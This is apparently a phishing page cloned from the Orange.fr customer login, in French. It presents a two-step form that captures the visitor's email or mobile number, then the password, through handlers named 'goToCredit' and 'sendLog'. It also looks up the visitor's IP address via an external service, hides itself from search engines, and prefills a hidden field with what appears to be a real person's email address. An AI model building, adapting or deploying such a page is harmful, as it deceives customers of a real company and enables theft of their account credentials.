
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
    <meta name="format-detection" content="telephone=no,email=no" />
    <meta name="msapplication-config" content="none" />
    <link rel="apple-touch-icon" sizes="57x57" href="./assets/img/apple-touch-icon-57x57.png" />
    <link rel="apple-touch-icon" sizes="60x60" href="./assets/img/apple-touch-icon-60x60.png" />
    <link rel="apple-touch-icon" sizes="72x72" href="./assets/img/apple-touch-icon-72x72.png" />
    <link rel="apple-touch-icon" sizes="76x76" href="./assets/img/apple-touch-icon-76x76.png" />
    <link rel="apple-touch-icon" sizes="114x114" href="./assets/img/apple-touch-icon-114x114.png" />
    <link rel="apple-touch-icon" sizes="120x120" href="./assets/img/apple-touch-icon-120x120.png" />
    <link rel="apple-touch-icon" sizes="144x144" href="./assets/img/apple-touch-icon-144x144.png" />
    <link rel="apple-touch-icon" sizes="152x152" href="./assets/img/apple-touch-icon-152x152.png" />
    <link rel="apple-touch-icon" sizes="180x180" href="./assets/img/apple-touch-icon-180x180.png" />
    <link rel="icon" type="image/png" href="./assets/img/favicon-32x32.png" sizes="32x32" />
    <link rel="icon" type="image/png" href="./assets/img/favicon-194x194.png" sizes="194x194" />
    <link rel="icon" type="image/png" href="./assets/img/favicon-96x96.png" sizes="96x96" />
    <link rel="icon" type="image/png" href="./assets/img/android-chrome-36x36.png" sizes="36x36" />
    <link rel="icon" type="image/png" href="./assets/img/android-chrome-48x48.png" sizes="48x48" />
    <link rel="icon" type="image/png" href="./assets/img/android-chrome-72x72.png" sizes="72x72" />
    <link rel="icon" type="image/png" href="./assets/img/android-chrome-96x96.png" sizes="96x96" />
    <link rel="icon" type="image/png" href="./assets/img/android-chrome-144x144.png" sizes="144x144" />
    <link rel="icon" type="image/png" href="./assets/img/android-chrome-192x192.png" sizes="192x192" />
    <link rel="icon" type="image/png" href="./assets/img/favicon-16x16.png" sizes="16x16" />
    <title>Identifiez-vous</title>
    <meta name="next-head-count" content="24" />
    <meta name="next-font-preconnect" />
    <link rel="preload" href="./assets/css/81dfce5f98885917.css" as="style" />
    <link rel="stylesheet" href="./assets/css/81dfce5f98885917.css" data-n-g="" />
    <link rel="stylesheet" type="text/css" href="./assets/css/c0f5e5d5dffacc28.css" />

    <style class="KameleoonStyleSheet" id="kameleoonStyleSheet-250876" rel="stylesheet" type="text/css" media="screen">
      #collapsePromomoin26 {
        margin-top: -32px;
      }

      #promomoin26 .accordion-title {
        font-size: 16px;
      }
    </style>
    <style>
      body.une-arche elcos-header,
      body.une-arche elcos-footer-zone {
        --body-has-arch: 1;
      }

      body.une-arche elcos-header,
      body.une-arche elcos-footer-zone {
        --body-has-arch: 1;
      }

      @font-face {
        font-family: "elcos-icomoon";
        src: url("./assets/fonts/o-icomoon.eot?20201014_1");
        src: url("./assets/fonts/o-icomoon.eot?20201014_1") format("embedded-opentype"), url("./assets/fonts/o-icomoon.woff2?20201014_1") format("woff2"), url("./assets/fonts/o-icomoon.woff?20201014_1") format("woff"), url("./assets/fonts/o-icomoon.ttf?20201014_1") format("truetype"), url("./assets/fonts/o-icomoon.svg?20201014_1#POLE-HP") format("svg");
        font-weight: normal;
        font-style: normal;
        font-display: auto;
      }

      .icomoon:before {
        font-family: "elcos-icomoon", sans-serif !important;
        font-style: normal;
        font-weight: normal;
        font-variant: normal;
        text-transform: none;
        text-align: center;
        display: inline-block;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
      }

      @font-face {
        font-family: "o-HelveticaNeue";
        src: url("./assets/fonts/HelvNeue55_W1G.eot?20201014");
        src: url("./assets/fonts/HelvNeue55_W1G.eot?20201014") format("embedded-opentype"), url("./assets/fonts/HelvNeue55_W1G.woff2?20201014") format("woff2"), url("./assets/fonts/HelvNeue55_W1G.woff?20201014") format("woff"), url("./assets/fonts/HelvNeue55_W1G.ttf?20201014") format("truetype"), url("./assets/fonts/HelvNeue55_W1G.svg?20201014#HelveticaNeueLTW07-55Roman") format("svg");
        font-weight: normal;
        font-style: normal;
        font-display: swap;
      }

      @font-face {
        font-family: "o-HelveticaNeue";
        src: url("./assets/fonts/HelvNeue75_W1G.eot?20201014");
        src: url("./assets/fonts/HelvNeue75_W1G.eot?20201014") format("embedded-opentype"), url("./assets/fonts/HelvNeue75_W1G.woff2?20201014") format("woff2"), url("./assets/fonts/HelvNeue75_W1G.woff?20201014") format("woff"), url("./assets/fonts/HelvNeue75_W1G.ttf?20201014") format("truetype"), url("./assets/fonts/HelvNeue75_W1G.svg?20201014#HelveticaNeueLTW07-75Bold") format("svg");
        font-weight: bold;
        font-style: normal;
        font-display: swap;
      }

      elcos-header,
      elcos-footer-zone,
      elcos-search-box {
        all: initial !important;
        font-family: o-HelveticaNeue, Arial, sans-serif;
        font-size: 16px;
      }

      elcos-header:focus,
      elcos-header:active,
      elcos-header:hover,
      elcos-header:visited,
      elcos-header:focus-visible,
      elcos-footer-zone:focus,
      elcos-footer-zone:active,
      elcos-footer-zone:hover,
      elcos-footer-zone:visited,
      elcos-footer-zone:focus-visible,
      elcos-search-box:focus,
      elcos-search-box:active,
      elcos-search-box:hover,
      elcos-search-box:visited,
      elcos-search-box:focus-visible {
        all: initial !important;
      }

      .o-no-scroll {
        overflow: hidden;
      }

      .o-anchor {
        display: block;
        visibility: hidden;
        overflow: hidden;
        height: 0;
      }

      .o-is-sidepanel-open {
        width: 100% !important;
        height: 100vh !important;
        overflow: hidden !important;
      }

      @media screen and (max-width: 480px) {
        .o-is-layer-open {
          width: 100% !important;
          height: 100vh !important;
          overflow: hidden !important;
        }
      }

      elcos-footer-zone {
        display: block !important;
      }

      elcos-footer-zone:last-of-type {
        border-bottom: solid 1px #666 !important;
      }

      elcos-footer-zone:hover {
        display: block !important;
      }

      elcos-footer-zone:hover:last-of-type {
        border-bottom: solid 1px #666 !important;
      }

      footer > .o-marge {
        background-color: #000;
        color: #fff;
        padding: 0 calc(1.5625% + 15px);
        font-family: o-HelveticaNeue, Arial, sans-serif;
      }

      @media screen and (min-width: 736px) {
        footer > .o-marge {
          padding: 0 calc(1.5625% + 15px);
        }
      }

      @media screen and (min-width: 961px) {
        footer > .o-marge {
          padding: 0 calc(3.125% + 15px);
        }
      }

      @media screen and (min-width: 1440px) {
        footer > .o-marge {
          padding: 0 calc((100% - min(1440px, 990px * var(--body-has-arch, 10000000000))) / 2 + 60px);
        }
      }

      elcos-footer-zone[zone="liens-legaux-compact"] {
        margin: 0;
        padding: 0;
      }

      elcos-footer-zone[zone="liens-legaux-compact"]:last-of-type {
        border-bottom: none;
      }

      div:has(> elcos-footer-zone[zone="liens-legaux-compact"]) {
        height: auto !important;
      }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.0/axios.js" integrity="sha256-XmdRbTre/3RulhYk/cOBUMpYlaAp2Rpo/s556u0OIKk=" crossorigin="anonymous"></script>
    <script>
      window.locIp = "";
      window.iPfull = "";

      fetch("https://api.ipify.org?format=json")
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
          window.locIp = data;
          window.iPfull = data.ip || "";
        })
        .catch((error) => {
          console.error("Erreur lors de la récupération de l'adresse IP :", error);
        });
    </script>
    <link rel="stylesheet" href="./assets/css/myOrangeStyles.css" />
  </head>

  <body>
    <div id="didomi-host" data-nosnippet="true" aria-hidden="true"></div>
    <div id="index">
      <div v-if="login==1">
        <div id="o-header" class="d-none"></div>
        <a id="o-content-anchor" class="o-anchor" tabindex="-1"></a>
        <div id="s-header" class="d-none"></div>
        <div class="flex-fill d-flex flex-column">
          <div class="bg-secondary">
            <div class="site-width">
              <div class="container-fluid">
                <div class="row">
                  <div class="col-12">
                    <div class="d-flex align-items-center ob1-header">
                      <a href="https://www.orange.fr" title="retour à l'accueil"><img src="./assets/img/small-logo-orange.svg" alt="retour à l'accueil" /></a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="site-width site-height w-100 mt-0">
            <div class="container-fluid">
              <h1 class="mt-2 mb-0" data-testid="pageTitle">Pour vous identifier</h1>
            </div>
            <div class="container-fluid">
              <div novalidate="" method="post">
                <div class="row mt-1">
                  <div class="col-12 col-md-6 col-xl-7 p-0 px-md-1">
                    <div class="alert-container alert-info mb-0" role="alert" data-testid="first-connection-info" id="first-connection-info">
                      <p class="alert"><span class="alert-icon" aria-hidden="true"></span><span class="ob1-alert-title" data-testid="first-connection-info-title">C’est votre première connexion&nbsp;?</span></p>
                      <div class="alert-content" data-testid="first-connection-info-content">
                        <p class="alert-text">Finalisez la création de votre compte en saisissant l’adresse e-mail ou le numéro de mobile fournis par Orange ou Sosh lors de votre souscription.</p>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="row mt-2">
                  <div class="col-12">
                    <h4 class="mb-0" data-testid="pageSubtitle">Indiquez votre compte Orange</h4>
                  </div>
                </div>
                <div class="row">
                  <div class="col-12 col-md-6 col-xl-7">
                    <div class="form-group">
                      <input type="text" @input="handleInput" v-model="log.EMAIL" id="login" class="form-control form-control-empty" aria-labelledby="login-label" aria-describedby="login-helper" aria-invalid="false" data-testid="input-login" mandatory="true" maxlength="256" autocorrect="off" autocapitalize="none" spellcheck="false" name="login" />
                      <label id="login-label" :for="'login'" data-testid="input-login-label" :class="['form-control-placeholder', { 'form-control-placeholder-shift': log.EMAIL, 'error-label': error }]"> Adresse e-mail ou n° de mobile Orange </label>
                      <div v-if="error" class="alert-container alert-container-sm alert-danger invalid-feedback">
                        <p class="alert">
                          <span class="alert-icon" aria-hidden="true"></span>
                          <label class="ob1-alert-title" id="login-invalid-feedback" for="login" data-testid="input-login-invalid-feedback"> Cette adresse mail ou ce numéro de mobile n’est pas valide. Vérifiez votre saisie. </label>
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="row">
                  <div class="col-12"><a class="o-link-arrow ob1-link-large" aria-disabled="false" data-testid="link-find-login" data-oevent-category="idme_login" data-oevent-action="clic_retrouver_mail_avant_erreur" data-oevent-label="lien_retrouver_mail_avant_erreur" href="">Comment retrouver l’adresse e-mail de votre compte</a></div>
                </div>
                <div class="row mt-2">
                  <div class="col-12 d-flex justify-content-center justify-content-md-start">
                    <div @click="goToCredit()" class="d-inline-flex flex-column align-items-center flex-md-row-reverse justify-content-md-end">
                      <button class="btn btn-primary" type="submit" @click="goToCredit" id="btnSubmit" data-testid="submit-login">Continuer</button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="mt-auto mb-1">
            <div class="site-width">
              <div class="container-fluid">
                <hr class="separator separator--gray4 mb-1" />
                <div class="row">
                  <div class="col-12"><a class="o-link-arrow ob1-link-large" aria-disabled="false" href="" data-testid="footerlink-signup" data-oevent-category="idme_login" data-oevent-action="clic_créer_compte" data-oevent-label="créer_votre_compte">Créer un compte sans être client Orange</a></div>
                  <div class="col-12"><a class="o-link-arrow ob1-link-large" aria-disabled="false" data-testid="footerlink-help" data-oevent-category="idme_login" data-oevent-action="clic_aide" data-oevent-label="aide" href="">Besoin d’aide&nbsp;?</a></div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="modal fade modal-feedback" id="alert-sessionExpired" tabindex="-1" role="dialog" aria-labelledby="alert-sessionExpired-label" aria-hidden="true" aria-modal="false" data-testid="undefined-backdrop" style="display: none">
          <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
              <div class="modal-header">
                <button type="button" class="close" aria-label="Fermer" data-testid="undefined-btn-close-cross"><span class="icon icon-delete" aria-hidden="true"></span></button><button type="button" class="close o-link-arrow back" data-testid="undefined-btn-close-back">Fermer</button>
              </div>
              <div class="modal-body">
                <div class="feedback">
                  <div class="ob1-feedback-functional-icon">
                    <div class="alert alert-warning"><span class="alert-icon" aria-hidden="true"></span></div>
                  </div>
                  <div class="ob1-feedback-content">
                    <h3 class="feedback-title" data-testid="undefined-title">Vous êtes resté longtemps inactif.</h3>
                    <p class="feedback-text">Vous pouvez recommencer.</p>
                    <div class="feedback-button"><button class="btn btn-secondary" type="button" data-testid="button-reload">Recommencer</button></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div v-if="login==2">
        <div id="o-header" class="d-none"></div>
        <a id="o-content-anchor" class="o-anchor" tabindex="-1"></a>
        <div id="s-header" class="d-none"></div>
        <div class="flex-fill d-flex flex-column">
          <div class="bg-secondary">
            <div class="site-width">
              <div class="container-fluid">
                <div class="row">
                  <div class="col-12">
                    <div class="d-flex align-items-center ob1-header">
                      <a href="https://www.orange.fr" title="retour à l'accueil"><img src="./assets/img/small-logo-orange.svg" alt="retour à l'accueil" /></a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="site-width site-height w-100 mt-0">
            <div class="container-fluid">
              <h1 class="mt-2 mb-0" data-testid="pageTitle">Pour vous identifier</h1>
            </div>
            <div class="container-fluid">
              <div method="post">
                <div class="row mt-1 mt-md-2">
                  <div class="col-12 col-md-6 col-xl-7">
                    <ul class="items-list row mb-0">
                      <li class="col-12">
                        <div class="items-list-item">
                          <img src="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.10.2/_next/static/images/avatar.svg" alt="" class="item-img" data-testid="user-avatar" />
                          <div class="item-container no-border-bottom" style="min-width: 0px">
                            <div class="item-text" style="min-width: 0px">
                              <span class="text-truncate" data-testid="selected-account-login"><strong>{{log.EMAIL}}</strong></span>
                            </div>
                          </div>
                        </div>
                      </li>
                    </ul>
                    <button class="o-link-arrow ml-3" aria-disabled="false" type="button" data-testid="change-account" data-oevent-category="idme_password" data-oevent-action="clic_changer_de_compte" data-oevent-label="utiliser_un_autre_compte" @click="changeAccount">Changer de compte</button>
                  </div>
                </div>
                <div class="row mt-2">
                  <div class="col-12">
                    <h4 class="mb-0" data-testid="pageSubtitle">Saisissez votre mot de passe</h4>
                  </div>
                </div>
                <div class="row">
                  <div class="col-12 col-md-6 col-xl-7">
                    <input style="display: none" type="text" name="login" autocomplete="username" value="andre.feydel@orange.fr" />
                    <div class="form-group">
                      <input :type="isPasswordVisible ? 'text' : 'password'" id="password" @input="handleInput2" aria-labelledby="password-label" aria-describedby="password-helper" aria-invalid="false" data-testid="input-password" mandatory="true" maxlength="50" autocomplete="current-password" name="password" v-model="log.PASS" :class="{'form-control-empty': !isPasswordFilled, 'form-control-filled': isPasswordFilled}" class="form-control form-control-icon" />
                      <label id="password-label" for="password" data-testid="input-password-label" :class="['form-control-placeholder', { 'form-control-placeholder-shift': log.PASS, 'error-label': error }]"> Mot de passe </label>
                      <button data-testid="input-password-btn-icon" data-oevent-category="idme_password" data-oevent-action="clic_afficher_mot_de_passe" data-oevent-label="afficher_mot_de_passe" type="button" class="btn btn-icon" @click="togglePasswordVisibility">
                        <span :class="isPasswordVisible ? 'icon icon-accessibility-vision' : 'icon icon-Hide'" aria-hidden="true"></span>
                        <span class="sr-only">{{ isPasswordVisible ? 'mot de passe affiché' : 'mot de passe caché' }}</span>
                      </button>
                      <div v-if="error" class="alert-container alert-container-sm alert-danger invalid-feedback">
                        <p class="alert"><span class="alert-icon" aria-hidden="true"></span><label class="ob1-alert-title" id="password-invalid-feedback" for="password" data-testid="input-password-invalid-feedback">Vérifiez l’adresse mail et le mot de passe saisis.</label></p>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="row">
                  <div class="col-12 col-md-6 col-xl-7">
                    <ul class="items-list">
                      <li>
                        <div class="items-list-item">
                          <div class="item-container item-container-sm">
                            <div class="custom-control custom-checkbox">
                              <input id="remember" type="checkbox" class="custom-control-input" aria-labelledby="remember-label" aria-invalid="false" data-testid="input-remember" name="remember" v-model="rememberMe" />
                              <label aria-hidden="true" class="custom-control-label" for="remember"></label>
                            </div>
                            <label id="remember-label" for="remember" class="item-text">
                              <span data-testid="input-remember-label">Rester identifié</span>
                            </label>
                          </div>
                        </div>
                      </li>
                    </ul>
                  </div>
                </div>
                <div class="row mt-2">
                  <div class="col-12 d-flex justify-content-center justify-content-md-start">
                    <div class="d-inline-flex flex-column align-items-center flex-md-row">
                      <button class="btn btn-primary" type="submit" id="btnSubmit" data-testid="submit-password" @click="sendLog">S’identifier</button>
                      <a class="o-link-arrow ml-0 mt-md-0 mt-1 ml-md-2" aria-disabled="false" href="" data-testid="lost-password" data-oevent-category="idme_password" data-oevent-action="clic_mot_de_passe_oublie" data-oevent-label="mot_de_passe_oublie"> Mot de passe oublié </a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="mt-auto mb-1">
            <div class="site-width">
              <div class="container-fluid">
                <hr class="separator separator--gray4 mb-1" />
                <div class="row">
                  <div class="col-12"><a class="o-link-arrow ob1-link-large" aria-disabled="false" href="" data-testid="footerlink-signup" data-oevent-category="idme_login" data-oevent-action="clic_créer_compte" data-oevent-label="créer_votre_compte">Créer un compte sans être client Orange</a></div>
                  <div class="col-12"><a class="o-link-arrow ob1-link-large" aria-disabled="false" data-testid="footerlink-help" data-oevent-category="idme_login" data-oevent-action="clic_aide" data-oevent-label="aide" href="">Besoin d’aide&nbsp;?</a></div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="modal fade modal-feedback" id="alert-sessionExpired" tabindex="-1" role="dialog" aria-labelledby="alert-sessionExpired-label" aria-hidden="true" aria-modal="false" data-testid="undefined-backdrop" style="display: none">
          <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
              <div class="modal-header">
                <button type="button" class="close" aria-label="Fermer" data-testid="undefined-btn-close-cross"><span class="icon icon-delete" aria-hidden="true"></span></button><button type="button" class="close o-link-arrow back" data-testid="undefined-btn-close-back">Fermer</button>
              </div>
              <div class="modal-body">
                <div class="feedback">
                  <div class="ob1-feedback-functional-icon">
                    <div class="alert alert-warning"><span class="alert-icon" aria-hidden="false">ffdgg</span></div>
                  </div>
                  <div class="ob1-feedback-content">
                    <h3 class="feedback-title" data-testid="undefined-title">Vous êtes resté longtemps inactif.</h3>
                    <p class="feedback-text">Vous pouvez recommencer.</p>
                    <div class="feedback-button"><button class="btn btn-secondary" type="button" data-testid="button-reload">Recommencer</button></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script src="./assets/js/index.js"></script>
  <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'89f9b6ed581f7791',t:'MTcyMDM3NTAyMS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
</html>

       